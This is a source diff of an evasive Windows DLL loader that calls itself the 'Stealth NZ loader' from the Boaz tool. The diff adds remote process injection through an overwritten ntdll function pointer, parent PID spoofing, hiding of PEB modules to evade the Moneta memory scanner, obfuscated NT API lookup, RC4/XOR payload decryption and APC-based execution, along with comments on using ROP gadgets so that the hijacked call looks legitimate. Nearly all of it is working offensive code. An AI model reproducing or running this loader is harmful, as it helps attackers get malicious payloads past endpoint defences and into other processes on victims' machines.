@@ -1,11 +1,15 @@
 /****
- * Stealth NZ loader: a APC write method with custom module DLL loading
- * Threadless execution
- * With option -ldr to add PEB to module list to evade Moneta
- * Local inejction only 
+ * Proof of concept only. 
+ * Stealth NZ loader: a APC write method with custom DLL loading
+ * Utilise virtual method table hooking as presented by x86 Matthew in his blog post
+ * With option -peb to add PEB to module list to evade Moneta
+ * Remote inejction version of loader-37 with Sifu memory guard. 
+ * TODO: implement PEM module loading for remote process. 
+ * TODO: implement full VMT hooking Sifu memory guard to remote process
+ * VMT Sifu memory guard for local process 
  * Add indirect syscall with Halo's gate method to replace NT functions used. 
  * Author: Thomas X Meng
-# Date 2023
+# Date June 2024
 #
 # This file is part of the Boaz tool
 # Copyright (c) 2019-2024 Thomas M
@@ -26,11 +30,171 @@
 #include "libloaderapi.h"
 #include <winnt.h>
 #include <lmcons.h>
+/// PEB module loader:
+#include "pebutils.h"
 // #include "HardwareBreakpoints.h"
 
+#define MAX_INPUT_SIZE 100
 
 typedef BOOL (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
 typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);
+
+/// DLL inj blocking and mitigation policies and ppid: 
+
+typedef BOOL(WINAPI *InitializeProcThreadAttributeListFunc)(
+    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
+    DWORD dwAttributeCount,
+    DWORD dwFlags,
+    PSIZE_T lpSize
+);
+
+typedef BOOL(WINAPI *UpdateProcThreadAttributeFunc)(
+    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
+    DWORD dwFlags,
+    DWORD_PTR Attribute,
+    PVOID lpValue,
+    SIZE_T cbSize,
+    PVOID lpPreviousValue,
+    PSIZE_T lpReturnSize
+);
+
+
+BOOL block_dlls_local()
+{
+
+	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY Policy = { 0 };
+	Policy.MicrosoftSignedOnly = 1;
+
+	BOOL result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &Policy, sizeof(Policy));
+	
+	if (!result)
+	{
+		printf("[-] Failed to set DLL block for current process (%u)\n", GetLastError());
+
+        return 0;
+	}
+	
+	return 1;
+}
+
+
+
+///// End of DLL inj blocking and policy mitigation.
+
+
+//// VMT hooking:
+BOOL bUseRtlCreateUserThread = FALSE, bUseCreateThreadpoolWait = FALSE; // Default to FALSE
+BOOL bUseNoAccess = FALSE; 
+HANDLE hProcess = NULL; 
+
+SIZE_T regionSize = 0; // The size of the region
+PVOID dllEntryPoint = NULL;
+
+#define ADDR unsigned __int64
+// Define the size of HookStub (31 bytes from the disassembly)
+#define HOOKSTUB_SIZE 31
+//Define a marco global vaariable of PVOID:
+#define DECLARE_GLOBAL_PTR(varName) \
+    PVOID varName = NULL;
+
+// Use the macro to declare a global variable
+DECLARE_GLOBAL_PTR(globalPointer);
+#define NATIVE_VALUE ULONGLONG
+#define DEBUG_REGISTER_EXEC_DR0 0x1
+#define DEBUG_REGISTER_EXEC_DR1 0x4
+#define DEBUG_REGISTER_EXEC_DR2 0x10
+#define DEBUG_REGISTER_EXEC_DR3 0x40
+
+#define SINGLE_STEP_FLAG 0x100
+#define CURRENT_EXCEPTION_STACK_PTR e->ContextRecord->Rsp
+#define CURRENT_EXCEPTION_INSTRUCTION_PTR e->ContextRecord->Rip
+#define SINGLE_STEP_FLAG 0x100
+
+
+/// custom mem cpy: 
+void *mcopy(void* dest, const void* src, size_t n){
+    char* d = (char*)dest;
+    const char* s = (const char*)src;
+    while (n--)
+        *d++ = *s++;
+    return dest;
+}
+
+///GetNtdllBase:
+ADDR *GetNtdllBase (void);
+
+
+// Define your thread start routine
+ULONG NTAPI ThreadStartRoutine(PVOID Context) {
+	// message box: 
+	MessageBoxA(NULL, "BaseThreadInitThunk is executed without hook", "BaseThreadInitThunk", MB_OK);
+	//do nothing:
+    return 0;
+}
+
+// Define basethreadinitthunk in Kernel32.dll:
+typedef ULONG (WINAPI *BaseThreadInitThunk_t)(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);
+BaseThreadInitThunk_t pBaseThreadInitThunk = NULL;
+
+DWORD_PTR dwGlobal_OrigCreateFileReturnAddr = 0;
+DWORD_PTR dwGlobal_OrigReferenceAddr = 0; 
+BYTE *pHookAddr = NULL;
+
+HANDLE newThread = NULL;
+
+// Function to be called from assembly to print a message
+int print_hook_message() {
+    printf("[+] HookStub executed!\n");
+	MessageBoxA(NULL, "BaseThreadInitThunk is hooked", "BaseThreadInitThunk", MB_OK);
+    // int result = 1 / 0;
+    //call the original function:
+    pBaseThreadInitThunk(0, ThreadStartRoutine, NULL);
+    return 0;
+}
+
+void hooked_function();
+PVOID fileBaseGlobal = NULL;
+DLLEntry DllEntryGlobal = NULL;
+
+int __declspec(naked) HookStub()
+{
+
+    // __asm__ volatile (
+    //     // "lea 0f(%%rip), %%rax \n"   // Load address of the next instruction into rax
+    //     "HookStub_start: \n"
+    //     "mov %[orig_addr], %%rcx \n" // Save original return address to global variable
+    //     // fill return value with 0x12345678
+    //     // "mov $0xC0000156, %%rax \n"
+    //     "sub $0x28, %%rsp \n"       // Allocate shadow space
+    //     "call *%[func_addr] \n"     // Call hook function
+    //     "add $0x28, %%rsp \n"       // Deallocate shadow space
+    //     "jmp *%%rcx\n\t"
+    //     "HookStub_end: \n"
+    //     :
+    //     : [func_addr] "r" (hooked_function),
+    //       [orig_addr] "m" (dwGlobal_OrigReferenceAddr)
+    // );
+
+    __asm__ volatile (
+        "movq %[orig_addr], %%rcx \n"   // Load the original return address into RCX
+        "subq $0x28, %%rsp \n"          // Allocate shadow space on the stack
+        "callq *%[func_addr] \n"        // Call the hooked function
+        "addq $0x28, %%rsp \n"          // Restore the stack
+        "jmpq *%%rcx \n"                // Jump back to the original return address
+        :
+        : [func_addr] "r" (hooked_function),
+          [orig_addr] "m" (dwGlobal_OrigReferenceAddr)
+        : "rcx"  
+    );
+
+    return 0;
+    
+
+}
+
+//////// end of VMT hooking. 
+
+
 
 // Standalone function to delay execution using WaitForSingleObjectEx
 void SimpleSleep(DWORD dwMilliseconds)
@@ -41,6 +205,14 @@ void SimpleSleep(DWORD dwMilliseconds)
         WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE);
         CloseHandle(hEvent); 
     }
+}
+
+const wchar_t* GetDllNameFromPath(const wchar_t* dllPath) {
+    const wchar_t* dllName = wcsrchr(dllPath, L'\\');
+    if (dllName) {
+        return dllName + 1; // Move past the backslash
+    }
+    return dllPath; // If no backslash found, the path is already the DLL name
 }
 
 
@@ -485,7 +657,7 @@ namespace dynamic {
             curr = curr->Flink;
         } while (curr != head);
 
-        return NULL;
+        return 0;
     }
 
     // Given the base address of a DLL in memory, returns the address of an exported function
@@ -514,7 +686,7 @@ namespace dynamic {
             }
         }
 
-        return NULL;
+        return 0;
     }
 
     // Given the base address of a DLL in memory, returns the address of an exported function by hash
@@ -537,7 +709,7 @@ namespace dynamic {
             }
         }
 
-        return NULL; // Function not found
+        return 0; // Function not found
     }
 
 
@@ -638,7 +810,10 @@ void PrintUsageAndExit() {
     wprintf(L"  -thread             Use an alternative NT call other than the NT create thread\n");
     wprintf(L"  -pool               Use Threadpool for APC Write\n");
     wprintf(L"  -ldr                use LdrLoadDll instead of NtCreateSection->NtMapViewOfSection\n");
+    wprintf(L"  -peb                Use custom function to add loaded module to PEB lists to evade Moneta\n");
+    wprintf(L"  -remote             Use remote process to load the DLL\n");
     wprintf(L"  -dotnet             Use .NET assemblies instead of regular DLLs\n");
+    wprintf(L"  -ppid               provide the target parent PID to spoof. \n");
     wprintf(L"  -a                  Switch to PAGE_NOACCESS after write the memory to .text section\n");
     ExitProcess(0);
 }
@@ -810,12 +985,26 @@ typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
     PHANDLE ThreadHandle,
     PCLIENT_ID ClientID);
 
+// deinfe pRtlExitUserThread:
+typedef NTSTATUS (NTAPI *pRtlExitUserThread)(
+    NTSTATUS ExitStatus
+);
+
+
+//define NtOpenProcess:
+typedef NTSTATUS (NTAPI *NtOpenProcess_t)(
+    PHANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID ClientId
+);
 
 // Define the NT API function pointers
 typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
 // typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
 typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
-
+//define NtUnMapViewOfSection:
+typedef LONG(__stdcall* NtUnmapViewOfSection_t)(HANDLE, PVOID);
 typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
 
 typedef NTSTATUS (__stdcall* NtProtectVirtualMemory_t)(
@@ -842,10 +1031,11 @@ typedef NTSTATUS (__stdcall* NtQueryInformationProcess_t)(
     PULONG ReturnLength
 ); 
 
-
+NtOpenProcess_t NtOpenFuture;
 LdrLoadDll_t LdrLoadDll;
 NtCreateSection_t NtCreateSection;
 NtMapViewOfSection_t NtMapViewOfSection;
+NtUnmapViewOfSection_t NtUnmapViewOfSection;
 NtCreateTransaction_t NtCreateTransaction;
 NtProtectVirtualMemory_t NtProtectVirtualMemory;
 NtWaitForSingleObject_t MyNtWaitForSingleObject;
@@ -864,15 +1054,20 @@ void LoadNtFunctions() {
     const char NtCreateFutureStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
     const char NtFutureTranscationStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'r', 'a', 'n', 's', 'a', 'c', 't', 'i', 'o', 'n', 0 };
     const char NtViewFutureStr[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
+    const char NtUnviewFutureStr[] = { 'N', 't', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
     const char NtProtectFutureMemoryStr[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
     const char LdrLoadDllStr[] = { 'L', 'd', 'r', 'L', 'o', 'a', 'd', 'D', 'l', 'l', 0 };
     const char NtwaitForSingleObjectStr[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
     // for NtQueryInformationProcess
     const char NtQueryInformationProcessStr[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
+    // char for NtOpenProcess:
+    const char NtOpenFutureStr[] = { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
     //we should output 
 
+    NtOpenFuture = (NtOpenProcess_t) _import_crucial(NtOpenFutureStr, NtOpenProcess_t);
     NtCreateSection = (NtCreateSection_t) _import_crucial(NtCreateFutureStr, NtCreateSection_t);
     NtMapViewOfSection = (NtMapViewOfSection_t) _import_crucial(NtViewFutureStr, NtMapViewOfSection_t);
+    NtUnmapViewOfSection = (NtUnmapViewOfSection_t) _import_crucial(NtUnviewFutureStr, NtUnmapViewOfSection_t);
     NtCreateTransaction = (NtCreateTransaction_t) _import_crucial(NtFutureTranscationStr, NtCreateTransaction_t);
     NtProtectVirtualMemory = (NtProtectVirtualMemory_t) _import_crucial(NtProtectFutureMemoryStr, NtProtectVirtualMemory_t);
     LdrLoadDll = (LdrLoadDll_t) _import_crucial(LdrLoadDllStr, LdrLoadDll_t);
@@ -925,7 +1120,84 @@ BOOL ChangeDllPath(HMODULE hModule, const wchar_t* newPath) {
     return FALSE;
 }
 
+/// Sys func 32 and 33: 
 
+// Setup structs
+typedef struct _CRYPT_BUFFER {
+	DWORD Length;
+	DWORD MaximumLength;
+	PVOID Buffer;
+} CRYPT_BUFFER, * PCRYPT_BUFFER, DATA_KEY, * PDATA_KEY, CLEAR_DATA, * PCLEAR_DATA, CYPHER_DATA, * PCYPHER_DATA;
+
+// Define the function pointers
+typedef NTSTATUS(WINAPI* SystemFunction032_t)(PCRYPT_BUFFER pData, PDATA_KEY pKey);
+typedef NTSTATUS(WINAPI* SystemFunction033_t)(PCRYPT_BUFFER pData, PDATA_KEY pKey);
+
+SystemFunction032_t sysfunc32 = NULL;
+SystemFunction033_t SystemFunction033 = NULL;
+
+static char _key[] = "BOAZ is the best!";
+
+static CRYPT_BUFFER pData = { 0 };
+static DATA_KEY pKey = { 0 };
+
+void initialize_keys() {
+    pKey.Buffer = (PVOID)(_key);
+    pKey.Length = sizeof(_key);
+    pKey.MaximumLength = sizeof(_key);
+}
+
+void initialize_data(char* dllEntryPoint1, DWORD dll_len) {
+    pData.Buffer = (char*)(dllEntryPoint1);
+    pData.Length = dll_len;
+    pData.MaximumLength = dll_len;
+}
+
+char key[16];
+unsigned int r = 0;
+
+void sUrprise(char * data, size_t data_len, char * key, size_t key_len) {
+	int j;
+	int b = 0;
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+			if (j == key_len - 1) j = 0;
+			b++;
+			data[i] = data[i] ^ key[j];
+			j++;
+	}
+}
+
+
+//// Worker call back functions: 
+
+typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
+typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
+typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);
+
+typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
+    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
+    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
+    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
+    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
+    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
+} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;
+
+typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
+    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
+    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
+    PVOID address;                       // PVOID BaseAddress - rdx
+    PVOID buffer;                        // PVOID Buffer - r8
+    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
+    ULONG bytesWritten;
+} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;
+
+extern "C" {
+    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+}
 /////////////////////////////////////// APC Write:
 
 #define NT_CREATE_THREAD_EX_SUSPENDED 1
@@ -940,6 +1212,20 @@ typedef enum _QUEUE_USER_APC_FLAGS {
 } QUEUE_USER_APC_FLAGS;
 
 
+
+
+#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
+#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
+#endif
+
+#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
+#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
+#endif
+
+#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
+#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // don't update synchronization objects
+#endif
+
 // typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
 typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
     HANDLE ThreadHandle,
@@ -950,6 +1236,8 @@ typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
     PVOID SystemArgument2 OPTIONAL,
     PVOID SystemArgument3 OPTIONAL
 );
+
+
 
 typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
 
@@ -999,6 +1287,12 @@ DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD 
         return 1;
     }
 
+            NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
+            if (!pNtCreateThreadEx) {
+                printf("[-] Failed to locate NtCreateThreadEx.\n");
+                return 1;
+            }
+
     if(!bUseCreateThreadpoolWait){
         if (useRtlCreateUserThread) {
             pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
@@ -1028,11 +1322,7 @@ DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD 
             // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
             // SuspendThread(hThread);
         } else {
-            NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
-            if (!pNtCreateThreadEx) {
-                printf("[-] Failed to locate NtCreateThreadEx.\n");
-                return 1;
-            }
+
 
             ULONG status = pNtCreateThreadEx(
                 &hThread,
@@ -1059,7 +1349,24 @@ DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD 
             printf("[-] Failed to open thread: %lu\n", GetLastError());
             return 1;
         }
-        
+        // ULONG status = pNtCreateThreadEx(
+        //     &hThread,
+        //     NT_CREATE_THREAD_EX_ALL_ACCESS,
+        //     NULL,
+        //     hProcess,
+        //     (PVOID)(ULONG_PTR)ExitThread,
+        //     NULL,
+        //     NT_CREATE_THREAD_EX_SUSPENDED,
+        //     0,
+        //     0,
+        //     0,
+        //     NULL);
+
+        // if (status != 0) {
+        //     printf("[-] Failed to create remote thread: %lu\n", status);
+        //     return 1;
+        // }
+        // printf("[+] NtCreateThreadEx succeeded\n");
     }
 
 
@@ -1306,8 +1613,255 @@ BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
     return ret;
 }
 
+////////////////////////////////////////
+typedef DWORD(WINAPI *PFN_GETLASTERROR)();
+typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
 
-void DisableDebugPrivilege(); 
+BOOL IsSystem64Bit() {
+    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
+    if (!hKernel32) return FALSE;
+
+    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
+    if (!pGetNativeSystemInfo) {
+        FreeLibrary(hKernel32);
+        return FALSE;
+    }
+
+    BOOL bIsWow64 = FALSE;
+    SYSTEM_INFO si = {0};
+    pGetNativeSystemInfo(&si);
+    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
+        bIsWow64 = TRUE;
+    }
+
+    FreeLibrary(hKernel32);
+    return bIsWow64;
+}
+
+///// VMT Hooking: 
+
+DWORD InstallHook()
+{
+	BYTE *pModuleBase = NULL;
+
+	// get base address of kernelbase.dll
+	// pModuleBase = (BYTE*)GetModuleHandle("kernelbase.dll");
+	// pModuleBase = (BYTE*)GetModuleHandle("gdi32full.dll");
+    //kernel32:
+    // pModuleBase = (BYTE*)GetModuleHandle("kernel32.dll");
+    // printf("[+] kernel32 is at: %p\n", pModuleBase);
+
+    pModuleBase = (BYTE*)GetModuleHandle("ntdll.dll");
+
+	if(pModuleBase == NULL)
+	{
+		return 1;
+	}
+
+	// get ptr to function reference
+	// pHookAddr = pModuleBase + 0x1DF650;
+    // Instruction 0x00007ff950e94a10 referenced at gdi32full.dll!0x00007ff950f2c1b8 (sect: .data, virt_addr: 0xFC1B8, stack delta: 0xA10)
+
+    // Instruction 0x00007ff950a36ec0 referenced at gdi32full.dll!0x00007ff950f2c058 (sect: .data, virt_addr: 0xFC058, stack delta: 0xA40)
+    pHookAddr = pModuleBase + 0x183EF0; //in ntdll.dll
+    //Instruction 0x00007ff953640a90 referenced at KERNEL32.DLL!0x00007ff951eb7ce8 (sect: .data, virt_addr: 0xB7CE8, stack delta: 0x9A0)
+    // pHookAddr = pModuleBase + 0xB7CE8; //kernel32!RtlQueryFeatureConfiguration
+
+
+// Instruction 0x00007ff950e443b0 referenced at USER32.dll!0x00007ff951816240 (sect: .data, virt_addr: 0xB6240, stack delta: 0x8F0)
+    printf("[+] pHookAddr is at: %p\n", pHookAddr);
+    printf("[+] *(DWORD_PTR*)pHookAddr is at: %p\n", *(DWORD_PTR*)pHookAddr);
+    // // apply page guard to hooked VMT entry: 
+	// DWORD old = 0;
+    // if(VirtualProtect(reinterpret_cast<LPVOID>(pHookAddr), 1, PAGE_READWRITE | PAGE_GUARD, &old)) {
+    //     printf("[+] PAGE_GUARD set before pHookAddr API. \n");
+    // } else {
+    //     printf("[-] Failed to set PAGE_GUARD\n");
+    // }
+
+    // // add vectorexceptionhanlder:
+    // AddVectoredExceptionHandler(1, &BreakpointHandler_veh);
+    // AddVectoredContinueHandler(1, &BreakpointHandler_vch);
+
+	// store original value
+	// dwGlobal_OrigReferenceAddr = *(DWORD*)pHookAddr;
+    dwGlobal_OrigReferenceAddr = *(DWORD_PTR*)pHookAddr;
+    printf("[+] dwGlobal_OrigReferenceAddr is: %p\n", dwGlobal_OrigReferenceAddr);
+
+
+    printf("[+] memory scan now. \n");
+    getchar();
+	// overwrite virtual method ptr to call HookStub
+	// *(DWORD*)pHookAddr = (DWORD)HookStub;
+    // TODO: 
+    // There are 2 ways to execute at our DLL entry point, the first is to invoke it in the HookStub function,
+    *(DWORD_PTR*)pHookAddr = (DWORD_PTR)HookStub;
+    // The second is to pass the addr of dll entry point to the VMT global Ptr.
+    // VMT global Ptr will call it for us. 
+    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)DllEntryGlobal;
+    printf("[+] memory scan now. The VMT Ptr has been replaced. \n");
+    getchar();
+
+    printf("[+] *(DWORD_PTR*)pHookAddr after change: %p\n", *(DWORD_PTR*)pHookAddr);
+
+	return 0;
+}
+
+
+DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait);
+
+DWORD InstallHookRemote()
+{
+	BYTE *pModuleBase = NULL;
+
+	// get base address of kernelbase.dll
+	// pModuleBase = (BYTE*)GetModuleHandle("kernelbase.dll");
+	// pModuleBase = (BYTE*)GetModuleHandle("gdi32full.dll");
+    //kernel32:
+    // pModuleBase = (BYTE*)GetModuleHandle("kernel32.dll");
+    // printf("[+] kernel32 is at: %p\n", pModuleBase);
+
+    // pModuleBase = (BYTE*)GetModuleHandle("ntdll.dll"); ///replace this with custom ntdll get function TODO: 
+    pModuleBase = (BYTE*)GetNtdllBase();
+
+	if(pModuleBase == NULL)
+	{
+		return 1;
+	}
+
+	// get ptr to function reference
+	// pHookAddr = pModuleBase + 0x1DF650;
+    // Instruction 0x00007ff950e94a10 referenced at gdi32full.dll!0x00007ff950f2c1b8 (sect: .data, virt_addr: 0xFC1B8, stack delta: 0xA10)
+
+    // Instruction 0x00007ff950a36ec0 referenced at gdi32full.dll!0x00007ff950f2c058 (sect: .data, virt_addr: 0xFC058, stack delta: 0xA40)
+    pHookAddr = pModuleBase + 0x183EF0; //in ntdll.dll
+    //Instruction 0x00007ff953640a90 referenced at KERNEL32.DLL!0x00007ff951eb7ce8 (sect: .data, virt_addr: 0xB7CE8, stack delta: 0x9A0)
+    // pHookAddr = pModuleBase + 0xB7CE8; //kernel32!RtlQueryFeatureConfiguration
+
+
+// Instruction 0x00007ff950e443b0 referenced at USER32.dll!0x00007ff951816240 (sect: .data, virt_addr: 0xB6240, stack delta: 0x8F0)
+    printf("[+] VMT Ptr is at: %p\n", pHookAddr);
+    printf("[+] VMT Ptr before change: %p\n", *(DWORD_PTR*)pHookAddr);
+
+	// store original value
+    dwGlobal_OrigReferenceAddr = *(DWORD_PTR*)pHookAddr;
+    printf("[+] dwGlobal_OrigReferenceAddr is: %p\n", dwGlobal_OrigReferenceAddr);
+    //print &DllEntryGlobal:
+    printf("[+] DllEntryGlobal is at: %p\n", &DllEntryGlobal);
+
+    printf("[+] memory scan now. \n");
+    getchar();
+	// overwrite virtual method ptr to call HookStub
+	// *(DWORD*)pHookAddr = (DWORD)HookStub;
+    // TODO: 
+    // There are 2 ways to execute at our DLL entry point, the first is to invoke it in the HookStub function,
+    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)HookStub;
+    // The second is to pass the addr of dll entry point to the VMT global Ptr.
+    // VMT global Ptr will call it for us. 
+    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)DllEntryGlobal;
+
+    /// Set workers and use custom stack to write memory:
+	// const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
+    // const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
+    // FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(libName), "TpAllocWork");
+    // FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(libName), "TpPostWork");
+    // FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(libName), "TpReleaseWork");
+
+    // ULONG bytesWritten = 0;
+    // NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
+    // ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtWriteFuture);
+    // ntWriteVirtualMemoryArgs.hProcess = hProcess;
+    // ntWriteVirtualMemoryArgs.address = (LPVOID)pHookAddr;
+    // ntWriteVirtualMemoryArgs.buffer = &dllEntryPoint;
+    // ntWriteVirtualMemoryArgs.size = sizeof(DWORD_PTR);
+    // ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;
+
+    // // // // / Set workers
+
+    // PTP_WORK WorkReturn2 = NULL;
+    // // getchar();
+    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
+    // ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
+    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
+    // printf("Bytes written: %lu\n", bytesWritten);
+
+
+    SIZE_T bytesWritten;
+    if (!WriteProcessMemory(hProcess, (LPVOID)pHookAddr, &DllEntryGlobal, sizeof(DWORD_PTR), &bytesWritten)) {
+        printf("[-] Failed to write memory. Error: %lu\n", GetLastError());
+    } else {
+        printf("[+] Pointer value successfully written to the address that pHookAddr points to in the remote process.\n");
+    }
+
+    if (bytesWritten != sizeof(DWORD_PTR)) {
+        printf("[-] Incorrect number of bytes written. Expected: %zu Got: %zu\n", sizeof(DWORD_PTR), bytesWritten);
+        printf("[-] bytesWritten: %zu\n", bytesWritten);
+    } else {
+        printf("[+] Successfully wrote the correct number of bytes.\n");
+        printf("[-] bytesWritten: %zu\n", bytesWritten);
+        printf("[+] VMT Ptr after change: %p\n", *(DWORD_PTR*)pHookAddr);
+
+    }
+
+    // There is however, another trick. We can find the Rop gadgets that has a JMP opcode to 
+    // any addr 0xAABBCCDD. We can use this to jump to our DllEntryGlobal by replacing 0xAABBCCDD with DllEntryGlobal. 
+    // Then we can overwrite the VMT Ptr with the addr of the Rop gadget. The RoP gadegt can be found within 
+    // .text section of a legitimate module. Therefore, it is legitimate for the VMT Ptr to "call" code in .text section. 
+
+
+//     const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
